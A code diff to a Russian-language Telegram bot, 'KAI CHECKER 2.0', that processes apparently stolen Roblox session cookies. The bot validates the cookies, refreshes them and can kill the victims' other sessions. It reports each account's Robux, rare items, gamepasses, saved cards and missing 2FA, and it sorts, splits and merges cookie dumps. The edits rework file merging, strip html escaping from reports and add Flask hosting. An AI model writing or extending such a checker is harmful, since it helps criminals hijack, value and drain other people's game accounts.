@@ -1,4 +1,3 @@
-python
 import telebot
 import os
 import time
@@ -68,7 +67,9 @@ except ImportError:
     cffi_requests = None
     HAS_CFFI = False
 
-# ===== СЛОВАРЬ ИГР (ТОЛЬКО ИЗ НЕГО ОТОБРАЖАЮТСЯ В КРАТКОМ ОТЧЁТЕ) =====
+# ============================================================
+# СЛОВАРЬ ИГР
+# ============================================================
 
 MAIN_GAMES = {
     "blox fruits", "rivals", "adopt me", "pet sim 99",
@@ -192,7 +193,6 @@ def get_full_info(cookie: str) -> dict:
             info['TotalRAP'] = tr
             info['RareItems'] = ri[:5]
         
-        # Сбор геймпассов
         try:
             r = s.get(f'https://economy.roblox.com/v2/users/{uid}/transactions?limit=50&transactionType=Purchase', timeout=5, verify=False)
             if r.status_code == 200:
@@ -215,11 +215,11 @@ def get_full_info(cookie: str) -> dict:
     return info
 
 # ============================================================
-# ФОРМАТИРОВАНИЕ ОТЧЁТА (КРАТКИЙ — ТОЛЬКО ГЛАВНЫЕ ИГРЫ)
+# ФОРМАТИРОВАНИЕ ОТЧЁТА
 # ============================================================
 
 def format_short_report(info):
-    un = html.escape(str(info.get('Username', '?')))
+    un = info.get('Username', '?')
     year = info.get('Created', '????')[-4:] if info.get('Created') else '?'
     status = info.get('status', '⚠️')
     status_icon = '🟢' if status == '✅' else ('🔴' if status == '❌' else '🚫')
@@ -242,7 +242,6 @@ def format_short_report(info):
     r += f"   {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
     r += f"   💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
     
-    # Только главные игры
     gp = info.get('PurchasedGamepasses', {})
     main_gp = {game: passes for game, passes in gp.items() if is_main_game(game)}
     
@@ -257,13 +256,13 @@ def format_short_report(info):
             if len(passes) > 5:
                 r += f"      └ ...и ещё {len(passes)-5}\n"
     else:
-        r += f"\n📦 ГЕЙМПАССЫ: ❌ Нет (или только неосновные игры)\n"
+        r += f"\n📦 ГЕЙМПАССЫ: ❌ Нет\n"
     
     rare = info.get('RareItems', [])
     if rare:
         r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ ({len(rare)} шт):\n"
         for item in rare[:3]:
-            r += f"   └ {html.escape(str(item['name']))} (⏣ {item['rap']:,})\n"
+            r += f"   └ {item['name']} (⏣ {item['rap']:,})\n"
     else:
         r += f"\n💎 РЕДКИЕ ПРЕДМЕТЫ: ❌ Нет\n"
     
@@ -271,10 +270,6 @@ def format_short_report(info):
         r = r[:3700] + "\n\n<i>[Сообщение сокращено]</i>"
     
     return f"<blockquote>{r}\n\n<code>{info.get('Cookie', '')}</code></blockquote>"
-
-# ============================================================
-# ПОЛНЫЙ ОТЧЁТ В .TXT (ВСЕ ГЕЙМПАССЫ)
-# ============================================================
 
 def generate_full_txt_report(info):
     un = info.get('Username', '?')
@@ -289,13 +284,12 @@ def generate_full_txt_report(info):
     r += f"║  {status_text} | 🆔 {info.get('UserID', '?')}\n"
     r += f"║  📅 {info.get('Created', '?')} | 🌍 {info.get('Country', '?')}\n"
     r += f"╠══════════════════════════════════════════════════════════╣\n"
-    r += f"║  💰 Robux: ⏣ {info.get('Robux', 0):,} (Pending: {info.get('PendingRobux', 0):,})\n"
+    r += f"║  💰 Robux: ⏣ {info.get('Robux', 0):,}\n"
     r += f"║  💸 Донат/год: ⏣ {abs(info.get('OutgoingRobuxYear', 0)):,}\n"
     r += f"║  💎 RAP: ⏣ {info.get('TotalRAP', 0):,}\n"
     r += f"╠══════════════════════════════════════════════════════════╣\n"
     r += f"║  🛡️ БЕЗОПАСНОСТЬ:\n"
     r += f"║  📧 Почта: {'✅' if info.get('EmailSet') else '❌'} | 🔐 2FA: {'✅' if info.get('TwoFactorEnabled') else '❌'}\n"
-    r += f"║  🔒 PIN: {'✅' if info.get('AccountPinEnabled') else '❌'} | 📱 Тел: {'✅' if info.get('PhoneSet') else '❌'}\n"
     r += f"║  {info.get('SecurityStatus', '⚠️ НЕЗАЩИЩЕННЫЙ')}\n"
     r += f"║  💳 Карты: {info.get('CardsCount', 0)} | 📦 Предметы: {info.get('TotalInventory', 0)}\n"
     r += f"╠══════════════════════════════════════════════════════════╣\n"
@@ -310,7 +304,6 @@ def generate_full_txt_report(info):
                 r += f"║      └ {p['name']} — ⏣ {p['price']:,}\n"
             if len(passes) > 5:
                 r += f"║      └ ...и ещё {len(passes)-5}\n"
-        r += f"║\n"
     else:
         r += f"║  ❌ Нет геймпассов\n"
     
@@ -324,6 +317,13 @@ def generate_full_txt_report(info):
     r += f"╚══════════════════════════════════════════════════════════╝\n\n"
     r += f"🍪 COOKIE:\n{info.get('Cookie', '')}"
     return r
+
+def save_txt(info):
+    un = re.sub(r'[<>:"/\\|?*]', '_', str(info.get('Username', '?')))
+    fn = f"roblox_{un}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    with open(fn, 'w', encoding='utf-8') as f:
+        f.write(generate_full_txt_report(info))
+    return fn
 
 # ============================================================
 # ФРЕШЕР
@@ -389,13 +389,6 @@ def refresh_cookie_sync(cookie: str, kill_old: bool = True) -> tuple[bool, str, 
     finally:
         if loop and not loop.is_closed():
             loop.close()
-
-def save_txt(info):
-    un = re.sub(r'[<>:"/\\|?*]', '_', str(info.get('Username', '?')))
-    fn = f"roblox_{un}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-    with open(fn, 'w', encoding='utf-8') as f:
-        f.write(generate_full_txt_report(info))
-    return fn
 
 def log_check(uid, info):
     ds = datetime.now().strftime('%d.%m.%Y')
@@ -484,43 +477,35 @@ class Bot:
         return uid in ALLOWED_USERS
 
     def continue_menu(self):
-        kb = types.InlineKeyboardMarkup(row_width=2)
+        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
         kb.add(
-            types.InlineKeyboardButton("🔄 Проверить ещё", callback_data="check_again"),
-            types.InlineKeyboardButton("🏠 В меню", callback_data="menu_back")
-        )
-        return kb
-
-    def error_menu(self, mode):
-        kb = types.InlineKeyboardMarkup(row_width=2)
-        kb.add(
-            types.InlineKeyboardButton("🏠 В меню", callback_data="menu_back"),
-            types.InlineKeyboardButton("🔄 Повторить", callback_data=f"retry_{mode}")
+            telebot.types.InlineKeyboardButton("🔄 Проверить ещё", callback_data="check_again"),
+            telebot.types.InlineKeyboardButton("🏠 В меню", callback_data="menu_back")
         )
         return kb
 
     def main_menu(self):
-        kb = types.InlineKeyboardMarkup(row_width=2)
+        kb = telebot.types.InlineKeyboardMarkup(row_width=2)
         kb.add(
-            types.InlineKeyboardButton("🔍 Чекер", callback_data="menu_checker"),
-            types.InlineKeyboardButton("🔄 Фрешер", callback_data="menu_fresher")
+            telebot.types.InlineKeyboardButton("🔍 Чекер", callback_data="menu_checker"),
+            telebot.types.InlineKeyboardButton("🔄 Фрешер", callback_data="menu_fresher")
         )
         kb.add(
-            types.InlineKeyboardButton("✅ Валидатор", callback_data="menu_validator"),
-            types.InlineKeyboardButton("📊 Статистика", callback_data="menu_stats")
+            telebot.types.InlineKeyboardButton("✅ Валидатор", callback_data="menu_validator"),
+            telebot.types.InlineKeyboardButton("📊 Статистика", callback_data="menu_stats")
         )
         kb.add(
-            types.InlineKeyboardButton("📂 Сортер", callback_data="menu_sorter"),
-            types.InlineKeyboardButton("✂️ Разделитель", callback_data="menu_split")
+            telebot.types.InlineKeyboardButton("📂 Сортер", callback_data="menu_sorter"),
+            telebot.types.InlineKeyboardButton("✂️ Разделитель", callback_data="menu_split")
         )
         kb.add(
-            types.InlineKeyboardButton("📦 Слияние", callback_data="menu_merge"),
-            types.InlineKeyboardButton("ℹ️ Инфо", callback_data="menu_info")
+            telebot.types.InlineKeyboardButton("📦 Слияние", callback_data="menu_merge"),
+            telebot.types.InlineKeyboardButton("ℹ️ Инфо", callback_data="menu_info")
         )
         return kb
 
     def back_button(self):
-        return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("◀️ Назад", callback_data="menu_back"))
+        return telebot.types.InlineKeyboardMarkup().add(telebot.types.InlineKeyboardButton("◀️ Назад", callback_data="menu_back"))
 
     def mc(self):
         return "<b>🔍 KAI CHECKER 2.0</b>\n\n✅ Быстрая проверка куков\n🔄 Фрешер (новый, быстрее)\n✅ Валидатор (отсеивает мёртвые)\n📂 Сортер (по одному в файл)\n✂️ Разделитель (на части)\n📦 Слияние (удаляет дубли)\n📊 Статистика по аккаунтам\n\n<i>Выбери действие в меню ↓</i>"
@@ -656,10 +641,6 @@ class Bot:
                         self.bot.reply_to(msg, "❌ Куки не найдены")
                         return
                     self.process_split(msg, cookies)
-                elif mode == 'merge':
-                    # Для слияния нужно несколько файлов
-                    self.bot.reply_to(msg, "📦 Для слияния отправь несколько .txt файлов (минимум 2)")
-                    self.waiting[msg.chat.id] = 'merge_wait'
                 else:
                     cks = extract_cookies(ct)[:5]
                     if not cks:
@@ -680,12 +661,23 @@ class Bot:
 
             mode = self.waiting.get(msg.chat.id, 'checker')
             
-            # Обработка слияния (несколько файлов)
-            if mode == 'merge_wait':
+            # Обработка слияния
+            if mode == 'merge':
                 if msg.document and msg.document.file_name.endswith('.txt'):
-                    self.process_merge_files(msg)
+                    self.process_merge_single(msg)
                 else:
-                    self.bot.reply_to(msg, "❌ Отправь .txt файлы для слияния")
+                    self.bot.reply_to(msg, "📦 Отправь .txt файл с куками\nЯ буду ждать следующие файлы...")
+                    self.waiting[msg.chat.id] = 'merge_collect'
+                    self.merge_files = []
+                    self.merge_files.append(msg.document)
+                return
+            
+            if mode == 'merge_collect':
+                if msg.document and msg.document.file_name.endswith('.txt'):
+                    if not hasattr(self, 'merge_files'):
+                        self.merge_files = []
+                    self.merge_files.append(msg.document)
+                    self.bot.reply_to(msg, f"📦 Файл принят ({len(self.merge_files)}). Отправь ещё или нажми /done")
                 return
             
             cks = extract_cookies(msg.text)
@@ -699,6 +691,15 @@ class Bot:
             else:
                 self.bot.send_photo(msg.chat.id, LOGO_URL, caption=self.mc(), reply_markup=self.main_menu(), parse_mode='HTML')
 
+        @self.bot.message_handler(commands=['done'])
+        def done_merge(msg):
+            if not self.is_allowed(msg.chat.id):
+                return
+            if hasattr(self, 'merge_files') and len(self.merge_files) >= 2:
+                self.process_merge_files(msg)
+            else:
+                self.bot.reply_to(msg, "❌ Нужно минимум 2 файла для слияния")
+
     # ============================================================
     # ЧЕКЕР
     # ============================================================
@@ -711,7 +712,6 @@ class Bot:
         self.get_user_stats(uid).add(info)
         log_check(uid, info)
         
-        # Краткий отчёт в чат
         report = format_short_report(info)
         try:
             self.bot.edit_message_text(report, chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML')
@@ -719,7 +719,6 @@ class Bot:
             clean_report = report.replace("<blockquote>", "").replace("</blockquote>", "")
             self.bot.edit_message_text(clean_report, chat_id=msg.chat.id, message_id=st.message_id, parse_mode='HTML')
         
-        # Полный отчёт в .txt
         fn = save_txt(info)
         with open(fn, 'rb') as f:
             self.bot.send_document(msg.chat.id, f, caption=f"📄 Полный отчёт {info.get('Username', '?')}")
@@ -748,7 +747,6 @@ class Bot:
         valid_count = len([i for i in all_info if i.get('status') == '✅'])
         self.bot.send_message(msg.chat.id, f"<b>📊 ОТЧЕТ</b>\n✅ Валид: {valid_count}/{total}", parse_mode='HTML')
         
-        # Отправляем полные отчёты для валидных
         for info in all_info:
             if info.get('status') == '✅':
                 try:
@@ -868,9 +866,6 @@ class Bot:
         
         def do():
             try:
-                import zipfile
-                from io import BytesIO
-                
                 zip_buffer = BytesIO()
                 with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                     for i, cookie in enumerate(cookies[:50]):
@@ -901,9 +896,6 @@ class Bot:
         
         def do():
             try:
-                import zipfile
-                from io import BytesIO
-                
                 parts = 5
                 chunk_size = max(1, len(cookies) // parts)
                 chunks = [cookies[i:i+chunk_size] for i in range(0, len(cookies), chunk_size)]
@@ -932,34 +924,22 @@ class Bot:
     # СЛИЯНИЕ
     # ============================================================
 
+    def process_merge_single(self, msg):
+        if not hasattr(self, 'merge_files'):
+            self.merge_files = []
+        self.merge_files.append(msg.document)
+        self.bot.reply_to(msg, f"📦 Файл принят ({len(self.merge_files)}). Отправь ещё или нажми /done")
+
     def process_merge_files(self, msg):
         self.checking = True
-        
-        # Собираем все файлы
-        files = []
-        # В сообщении может быть несколько документов
-        if hasattr(msg, 'document') and msg.document:
-            files.append(msg.document)
-        
-        # Если есть список документов (несколько файлов в одном сообщении)
-        if hasattr(msg, 'media_group_id'):
-            # Ждём остальные файлы
-            self.bot.reply_to(msg, "⏳ Ожидаю все файлы...")
-            return
-        
-        if len(files) < 2:
-            self.bot.reply_to(msg, "❌ Отправь минимум 2 .txt файла")
-            self.checking = False
-            return
-        
-        st = self.bot.reply_to(msg, f"📦 Сливаю {len(files)} файлов...")
+        st = self.bot.reply_to(msg, f"📦 Сливаю {len(self.merge_files)} файлов...")
         
         def do():
             try:
                 all_cookies = []
                 filenames = []
                 
-                for doc in files:
+                for doc in self.merge_files:
                     if not doc.file_name.endswith('.txt'):
                         continue
                     fi = self.bot.get_file(doc.file_id)
@@ -974,7 +954,6 @@ class Bot:
                     self.checking = False
                     return
                 
-                # Удаляем дубли
                 unique_cookies = list(dict.fromkeys(all_cookies))
                 
                 filename = f"merged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
@@ -998,6 +977,7 @@ class Bot:
             finally:
                 self.checking = False
                 self.waiting.pop(msg.chat.id, None)
+                self.merge_files = []
         
         threading.Thread(target=do).start()
 
@@ -1011,5 +991,20 @@ class Bot:
                 logger.error(f"Polling error: {e}")
                 time.sleep(5)
 
+# ============================================================
+# ЗАПУСК
+# ============================================================
+
+def run_bot():
+    bot = Bot(TELEGRAM_BOT_TOKEN)
+    bot.run()
+
 if __name__ == "__main__":
-    Bot(TELEGRAM_BOT_TOKEN).run()
+    # Запускаем бота в фоновом потоке
+    bot_thread = threading.Thread(target=run_bot, daemon=True)
+    bot_thread.start()
+    
+    # Запускаем Flask для Render
+    port = int(os.environ.get("PORT", 5000))
+    print(f"🌐 Flask запущен на порту {port}")
+    app.run(host='0.0.0.0', port=port)
